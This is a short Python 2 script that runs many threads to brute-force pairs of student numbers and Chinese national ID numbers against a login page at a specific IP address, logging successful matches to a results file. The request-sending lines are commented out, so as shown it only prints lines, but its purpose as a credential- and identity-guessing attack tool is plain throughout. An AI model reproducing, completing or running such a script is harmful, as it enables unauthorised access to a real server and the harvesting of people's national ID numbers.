#coding=utf-8
import urllib2
import urllib
import httplib
import threading

header={"Content-Type":"application/x-www-form-urlencoded",
        "Connection":"keep-alive",
        "Referer":"http://211.70.176.123/wap/"}

lock=threading.Lock()
def TrySfzh(xh):
    global header
    global outFile
    global inFile
    
    for line in inFile.readlines():
        print threading.current_thread().name,line.strip()
        #sfzh=line.strip()
        #conn=httplib.HTTPConnection("211.70.176.123")
        #xh=xh.strip()
        #params=urllib.urlencode({'xh':xh,'sfzh':sfzh})
        #conn.request(method="POST",url="/wap/index.asp",body=params,headers=header)
        #responseText=conn.getresponse().read().decode('gb2312')
        #print responseText
        #if responseText.find(u'对不起') > 0 :
            #print '----find xh:',xh,'with sfzh:',sfzh,'thread:',threading.current_thread().name,'----'
            #outFile.write(xh+'  '+sfzh+'\n')
    return
    

outFile=open('result.txt','w')
inFile=open('sfzh.txt','r')

if __name__ == '__main__':
    tsk=[]
    with open('xh.txt','r') as fXh:
        for xh in fXh.readlines():
            for i in range(10):
                t=threading.Thread(target=TrySfzh,args=(xh,))
                tsk.append(t)
    for t in tsk:
        t.start()
        t.join(1) 
inFile.close()
outFile.close()
            
    
    
